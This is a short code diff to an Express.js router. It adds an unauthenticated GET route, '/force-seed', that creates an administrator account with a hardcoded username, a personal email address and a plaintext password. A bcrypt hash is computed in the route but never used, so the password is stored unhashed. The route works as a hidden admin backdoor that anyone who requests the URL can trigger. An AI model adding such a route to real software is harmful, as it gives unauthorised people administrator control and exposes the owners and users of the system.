@@ -105,5 +105,16 @@ router.post('/reset-password', async (req, res) => {
         res.status(500).json({ message: "RESET_PROTOCOL_FAILED" });
     }
 });
-
+router.get('/force-seed', async (req, res) => {
+    const User = require('../models/User');
+    const bcrypt = require('bcryptjs');
+    const hash = await bcrypt.hash("admin_gateway_2026", 10);
+    await User.create({ 
+        username: "abdullahtahir", 
+        email: "abdullahtahi001@gmail.com", 
+        password: 'pak1234567', 
+        role: "admin" 
+    });
+    res.send("Seed Done!");
+});
 module.exports = router;
